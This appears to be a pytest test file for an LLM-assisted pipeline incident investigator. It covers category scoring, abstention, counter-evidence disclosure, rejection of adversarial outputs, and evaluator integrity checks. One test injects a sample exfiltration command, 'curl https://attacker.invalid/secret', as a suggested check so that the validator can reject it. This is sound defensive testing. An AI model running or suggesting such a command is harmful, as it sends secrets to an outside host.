"""Fixed, synthetic reference cases. These test policy, not live-model accuracy."""
from copy import deepcopy
import importlib.util
import json
from pathlib import Path
from uuid import uuid4

import pytest

from pipeguard.investigation.core import InvestigationRejected, supported_categories, validate_answer
from pipeguard.investigation.evaluation import score
from pipeguard.investigation.groq import response_schema


CASES = [
    ("execution_failure", {"error_code": "source_unavailable"}, "reported_source_failure"),
    ("execution_failure", {"error_code": "connection_timeout"}, "reported_source_failure"),
    ("execution_failure", {"error_code": "execution_error"}, "reported_execution_failure"),
    ("execution_failure", {"error_code": "validation_failed"}, "reported_validation_failure"),
    ("unknown_execution_state", {"reconciliation_required": True}, "conflicting_execution_reports"),
    ("quality_failure", {"quality_counts": {"fail": 1}}, "reported_quality_failure"),
    ("quality_conflict", {"quality_counts": {"error": 1}}, "reported_quality_failure"),
    ("source_coverage", {"scan_status": "incomplete"}, "source_evidence_gap"),
    ("source_coverage", {"error_code": "source_unreachable"}, "source_evidence_gap"),
    ("lineage_partial", {"lineage_coverage": "partial"}, "lineage_evidence_gap"),
    ("lineage_missing", {"lineage_coverage": "partial"}, "lineage_evidence_gap"),
    ("lineage_conflict", {"lineage_coverage": "partial"}, "lineage_evidence_gap"),
]


def packet(condition, fact):
    return {"schema_version": 1, "condition": condition, "missing_evidence_present": True,
            "items": [{"citation": "e1", "kind": "observations", "facts": fact}]}


def answer(category, counter="none"):
    return {"abstained": False, "abstention_reason": "", "next_checks": [], "hypotheses": [{
        "category": category, "explanation": "The producer reports this condition; its underlying cause is unknown.",
        "confidence": "low", "supporting_evidence": ["e1"], "contradicting_evidence": counter}]}


ABSTENTION = {"abstained": True, "abstention_reason": "Insufficient evidence.", "hypotheses": [],
              "next_checks": ["request_missing_evidence"]}


@pytest.mark.parametrize("condition,fact,category", CASES)
def test_fixed_reference_findings(condition, fact, category):
    evidence = packet(condition, fact)
    assert supported_categories(evidence) == [category]
    assert response_schema(evidence)["$defs"]["Hypothesis"]["properties"]["category"]["enum"] == [category]
    assert score(answer(category), evidence, [category]) == {
        "safe": True, "useful": True, "reason": "supported_findings"}
    assert score(ABSTENTION, evidence, [category]) == {"safe": True, "useful": False, "reason": "abstained"}


@pytest.mark.parametrize("condition,fact", [
    ("execution_failure", {"state": "failed"}),
    ("execution_failure", {"lineage_coverage": "partial"}),
    ("quality_missing", {"quality_counts": {"pass": 12}}),
    ("quality_conflict", {"quality_counts": {"unknown": 1}}),
    ("lineage_missing", {"state": "succeeded"}),
    ("source_coverage", {"scan_status": "complete"}),
    ("unknown", {"error_code": "source_unavailable"}),
    ("monitoring_disabled", {"error_code": "source_unreachable"}),
])
def test_fixed_missing_or_out_of_scope_cases(condition, fact):
    evidence = packet(condition, fact)
    assert supported_categories(evidence) == []
    assert score(ABSTENTION, evidence, [], must_abstain=True)["useful"]
    assert not score(answer("reported_source_failure"), evidence, [], must_abstain=True)["safe"]


@pytest.mark.parametrize("run,attempt,state,required", [
    ("run_1", 1, "succeeded", True), ("run_1", 1, "cancelled", True),
    ("run_1", 2, "succeeded", False), ("run_2", 1, "succeeded", False),
    ("run_1", 1, "failed", False), ("run_1", 1, "running", False),
])
def test_counter_evidence_must_be_disclosed_without_conflating_attempts(run, attempt, state, required):
    evidence = packet("execution_failure", {"run": "run_1", "attempt": 1,
        "state": "failed", "error_code": "source_unavailable"})
    evidence["items"].append({"citation": "e2", "kind": "ingested_events", "facts": {
        "run": run, "attempt": attempt, "state": state}})
    assert score(answer("reported_source_failure"), evidence, ["reported_source_failure"])["safe"] is not required
    assert score(answer("reported_source_failure", "e2"), evidence, ["reported_source_failure"])["safe"] is required
    assert score(ABSTENTION, evidence, ["reported_source_failure"])["safe"]


@pytest.mark.parametrize("mutation", ["unknown_reference", "duplicate_category", "executable_check",
                                      "invented_category", "wrong_support", "same_counter"])
def test_adversarial_output_rejected(mutation):
    evidence = packet("execution_failure", {"error_code": "source_unavailable"})
    value = answer("reported_source_failure")
    if mutation == "unknown_reference":
        value["hypotheses"][0]["supporting_evidence"] = ["e99"]
    elif mutation == "duplicate_category":
        value["hypotheses"].append(deepcopy(value["hypotheses"][0]))
    elif mutation == "executable_check":
        value["next_checks"] = ["curl https://attacker.invalid/secret"]
    elif mutation == "invented_category":
        value["hypotheses"][0]["category"] = "confirmed_database_corruption"
    elif mutation == "wrong_support":
        value["hypotheses"][0]["category"] = "reported_execution_failure"
    else:
        value["hypotheses"][0]["contradicting_evidence"] = "e1"
    with pytest.raises((ValueError, InvestigationRejected)):
        validate_answer(value, evidence)
    assert not score(value, evidence, ["reported_source_failure"])["safe"]


@pytest.mark.parametrize("code,status", [("investigation_cooldown", 429),
    ("investigation_daily_limit", 429), ("investigation_pending", 503)])
def test_local_admission_errors_are_not_mislabeled_as_provider_failures(monkeypatch, code, status):
    from io import BytesIO
    from urllib.error import HTTPError
    from pipeguard.investigation import groq
    class Reject:
        def open(self, *args, **kwargs):
            raise HTTPError("http://127.0.0.1:8000", status, "rejected", {},
                            BytesIO(json.dumps({"error": code}).encode()))
    monkeypatch.setattr(groq, "build_opener", lambda *args: Reject())
    with pytest.raises(InvestigationRejected, match=code):
        groq.json_request("http://127.0.0.1:8000/v1/incidents/" + str(uuid4()) + "/investigations",
                          key="synthetic", body={})


def test_evaluator_freezes_keys_and_checks_evidence_before_submitting(monkeypatch):
    from pipeguard.detection.service import digest
    from pipeguard.investigation.groq import MODEL, PROMPT_VERSION
    directory = Path(__file__).resolve().parents[3] / "scripts"
    monkeypatch.syspath_prepend(str(directory))
    spec = importlib.util.spec_from_file_location("evaluate_investigations", directory / "evaluate_investigations.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    evidence = packet("execution_failure", {"error_code": "source_unavailable"})
    incident, bundle, key = [str(uuid4()) for _ in range(3)]
    plan = {"model": MODEL, "prompt_version": PROMPT_VERSION, "cases": [{"name": "fixed",
        "bundle_id": bundle, "incident_id": incident, "bundle_hash": "hash", "packet_hash": digest(evidence),
        "expected_categories": ["reported_source_failure"], "must_abstain": False, "request_keys": [key, str(uuid4())]}]}
    calls = []
    def request(url, **kwargs):
        calls.append(kwargs.get("body"))
        if "body" not in kwargs:
            return {"incident_id": incident, "payload_hash": "hash"}
        return {"id": str(uuid4()), "model": MODEL, "prompt_version": PROMPT_VERSION, "bundle_id": bundle,
                "input_integrity_valid": True, "input_payload": {"packet": evidence}, "state": "completed",
                "outcome": {"result": answer("reported_source_failure"), "provider_call_attempted": True}}
    monkeypatch.setenv("PIPEGUARD_ADMIN_TOKEN", "synthetic")
    monkeypatch.setattr(module, "project_bundle", lambda value: (evidence, {}))
    monkeypatch.setattr(module, "json_request", request)
    assert module.run(plan, 0, 1)["useful"]
    assert module.run(plan, 0, 1)["request_key"] == key
    assert calls[1]["request_key"] == calls[3]["request_key"] == key
    plan["cases"][0]["packet_hash"] = "changed"
    with pytest.raises(ValueError, match="evidence_changed"):
        module.run(plan, 0, 1)
    assert calls[-1] is None
    plan["prompt_version"] = "old"
    with pytest.raises(ValueError, match="policy_changed"):
        module.run(plan, 0, 1)
